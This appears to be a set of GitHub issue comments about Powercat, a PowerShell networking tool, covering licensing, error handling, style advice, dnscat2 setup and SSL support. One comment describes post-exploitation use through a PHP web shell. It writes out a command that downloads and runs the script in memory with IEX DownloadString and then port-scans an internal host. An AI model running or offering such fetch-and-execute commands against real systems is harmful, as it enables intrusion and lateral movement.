Hi,
Can you document explicitly under which license you are distributed your code?
(without explicit mention, all rights are reserved)
You could add a LICENSE file or add a explicit mention in the README.md
Thanks
Hi,

I'm using _Powercat_ to achieve a remote shell and after this, execute a port scan over other machines that the infected machine have visibilization.

I'm executing the port scaning of _Powercat_ from memory using the folowing command:

`powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); (21,22,80,443) | % {powercat -c 172.16.11.33 -p $_ -t 1 -Verbose}`

When I execute it, the remote shell disconnected and the result appear on the navigator which is used to infect the machine via PHP shell.

Why does it happen? How can I fix it?

Thanks!

Maybe I'm missing something, but there appears to be no way to detect connection errors - no exception/error is thrown/written, and `$?` evaluates to `True` in the following situations:

- specified host doesn't exist (timeout on connection)
- connection rejected
I am tying to connect to a dnscat2 server. I use the --security open setting, I assume that is correct, because I see no way to add a psk with powercat(yet!).

But im not getting a session. Any help on how to set this up would be great!

got a little farther. I set a dns domain on powercat and dnscat2 and it seems to connect.
I can enter a session now from dnscat back through but I have not commands or shell access.

The Powershell help system can now be used to inspect the function arguments and examples. Also you can now use the -Verbose switch to invoke the function with additional verbose output (that's what CmdletBinding is for).

Some recommendations in style and functionality
- PS functions follow the convention of ver-noun, this could be Invoke-PowerCat in the main function
- It is PS not Bash so help should be in comment based form so it is discoverable and parable by Get-Help and not use a -h/-help parameter (Run in a PowerShell console 'help about_Comment_Based_Help')
- The main function should be an advanced function with cmdletbinding so as to manage parameters properly (help about_Functions_CmdletBindingAttribute and help about_Functions_Advanced_Parameters)
- This is better suited as a module with a proper manifest where the main function is exported while the helper ones are hidden from the user so it can be used as a proper tool and allow for module autoloading, get-command discovery ..etc. (Look at help New-ModuleManifest -full)
- Parameter should be full named parameters and not single letters or be aliased as single letters, PowerShell behaves like Cisco IOS where for example -UDP can be -U or -UD as long as it is unique enough vs the other parameters.

The community and MS are working on a Style Guide and Best Practices guide https://github.com/PoshCode/PowerShellPracticeAndStyle I know I made the recommendations to the original author but since I see it is being maintained by others now I thought I would repeat them :)  

Payload generation only works for the client mode currently, and there is no certificate verification yet.
SSL listener mode does work with the full powercat cmdlet, and does generate self signed certificates on the fly.
